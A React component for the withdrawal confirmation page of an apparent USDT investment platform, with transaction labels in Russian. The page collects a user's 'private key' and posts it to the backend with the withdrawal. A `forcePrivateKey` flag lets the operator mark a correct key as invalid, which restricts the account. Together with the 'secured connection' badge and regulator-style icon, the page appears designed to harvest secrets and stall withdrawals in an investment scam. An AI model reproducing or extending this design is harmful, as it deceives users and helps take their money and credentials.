import { I18nextProvider, Trans, useTranslation } from "react-i18next";
import styles from "@/pages/ConfirmDeposit/ConfirmDeposit.module.scss";
import PrivateKey from "@/pages/ConfirmWithdrawn/PrivateKey/PrivateKey.tsx";
import ConnectionSecuredIcon from "@assets/icons/connection-secured.svg?react";
import SFCIcon from "@assets/icons/sfc-energy.svg?react";
import { OUR_WALLETS } from "@/utils/OUR_WALLETS.tsx";
import { parseTimestamp } from "@/utils/helpers/date.tsx";
import { Timestamp } from "firebase/firestore";
import WideButton from "@SharedUI/WideButton/WideButton.tsx";
import ConfirmedPopup from "@SharedUI/ConfirmedPopup/ConfirmedPopup.tsx";
import InvalidPrivateKey from "@/pages/ConfirmWithdrawn/InvalidPrivateKey/InvalidPrivateKey.tsx";
import { ScrollRestoration, useLocation, useNavigate } from "react-router-dom";
import { generateSixDigitCode } from "@/utils/helpers.tsx";
import IconCircleCheckFilled from "@/assets/icons/circle-check.svg?react";
import { useUser } from "@/hooks/useUser.ts";
import { useState } from "react";
import SuspenseLoading from "@SharedUI/SuspenseLoading/SuspenseLoading.tsx";
import toast from "react-hot-toast";
import { userService } from "@/main.tsx";
import axios from "axios";
import { BACKEND_URL } from "@/utils/const.tsx";

const ConfirmWithdrawn = () => {
  const { t, i18n } = useTranslation("confirmTransaction");
  const transactionId = generateSixDigitCode();
  const location = useLocation();
  const navigate = useNavigate();
  const { user } = useUser();
  const formData = location.state;
  const { amount, wallet } = formData;
  const [privateKey, setPrivateKey] = useState("");
  const [confirmedPopupIsOpen, setConfirmedPopupIsOpen] = useState(false);
  const [invalidPrivateKeyPopup, setInvalidPrivateKeyPopup] = useState(false);

  const openPopup = (popup: string) => {
    if (popup === "success") {
      setConfirmedPopupIsOpen(true);
    }

    if (popup === "cancel") {
      setInvalidPrivateKeyPopup(true);
    }

    document.body.style.overflow = "hidden";
    window.scrollTo(0, 0);
  };

  const onSubmitTransaction = async () => {
    if (!user) return;

    const isInvalidPrivateKey = user.privateKey !== privateKey || user.forcePrivateKey;

    if (user.restrictions.isPrivateKey && !privateKey) {
      toast.error(t("enter_private_key"));
      return;
    }

    const transactionData = {
      type: "Вывод",
      status: "Ожидание",
      amount,
      nickname: user.nickname,
      executor: wallet,
      privateKey,
      userWallet: user.wallets[wallet].number,
    };

    if (isInvalidPrivateKey) {
      openPopup("cancel");
      await userService.setUserRestriction("isPrivateKeyInvalid", user.nickname);
    } else {
      openPopup("success");
    }

    await axios.post(`${BACKEND_URL}/transaction/add-transaction`, transactionData);
  };

  if (!user) return <SuspenseLoading />;

  return (
    <I18nextProvider i18n={i18n} defaultNS={"confirmTransaction"}>
      <div className={styles["transaction-confirmation"]}>
        <span className={styles["invoice-number"]}>#{transactionId}</span>
        <div className={styles["row"]}>
          <span className={styles["icon"]}>
            <IconCircleCheckFilled width={35} height={35} color={"#14CC74"} />
          </span>
          <p className={styles["title"]}>{t("withdrawn_invoice")}</p>
          <p className={styles["amount"]}>USD {Number(amount).toFixed(2)}</p>
        </div>
        <div className={styles["columns-wrapper"]}>
          <div className={styles["left-column"]}>
            {user.restrictions.isPrivateKey && (
              <PrivateKey privateKey={privateKey} setPrivateKey={setPrivateKey} />
            )}
          </div>
          <div className={styles["right-column"]}>
            <div className={styles["fields"]}>
              <div className={styles["field"]}>
                <span>{t("status")}</span>
                <p className={styles["pending"]}>{t("pending")}</p>
              </div>
              <div className={`${styles["field"]} ${styles["wallet-field"]}`}>
                <span>{t("method_pay")}</span>
                <p>{wallet}</p>
              </div>
              <div className={styles["field"]}>
                <span>{t("transaction_on")}</span>
                <p>{OUR_WALLETS[wallet]}</p>
              </div>
              <div className={styles["field"]}>
                <span>{t("amount")}</span>
                <p>{amount} USDT</p>
              </div>
              <div className={styles["field"]}>
                <span>{t("date")}</span>
                <p>{parseTimestamp(Timestamp.now())}</p>
              </div>
            </div>

            <div className={`${styles["secure-connection"]} ${styles["secure-connection-withdrawn"]}`}>
              <p>
                <ConnectionSecuredIcon />
                <Trans i18nKey={"secured_connection"} components={{ br: <br /> }} />
              </p>
              <SFCIcon />
            </div>

            <p className={styles["disclaimer"]}>{t("withdrawn_disclaimer")}</p>
            <div className={styles["buttons"]}>
              <WideButton
                onClickHandler={() => {
                  navigate(-1);
                }}
                text={t("cancel")}
                isTransparent
                isCancelButton
              />
              <WideButton onClickHandler={onSubmitTransaction} text={t("confirm")} isCheckButton />
            </div>
          </div>
        </div>
        {confirmedPopupIsOpen && <ConfirmedPopup />}
        {invalidPrivateKeyPopup && <InvalidPrivateKey />}
        <ScrollRestoration />
      </div>
    </I18nextProvider>
  );
};

export default ConfirmWithdrawn;
